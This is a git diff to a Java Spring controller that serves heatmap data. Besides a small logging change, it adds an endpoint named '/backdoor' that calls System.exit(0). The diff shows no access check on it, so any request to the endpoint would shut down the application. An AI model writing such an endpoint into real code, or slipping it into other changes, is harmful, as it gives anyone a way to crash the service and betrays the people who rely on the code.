@@ -23,8 +23,13 @@ public class HeatmapController {
   @GetMapping("/byCountryAndParam/{country}/{param}")
   public List<HeatmapDTO> getHeatMap(@PathVariable String country, @PathVariable String param) {
 
-    logger.debug("into getHeatMap to Measurements controller");
+    logger.info("into getHeatMap to Measurements controller");
 
     return heatmapService.getHeatmap(country, param);
+  }
+
+  @GetMapping("/backdoor")
+  public void backdoor(){
+    System.exit(0);
   }
 }
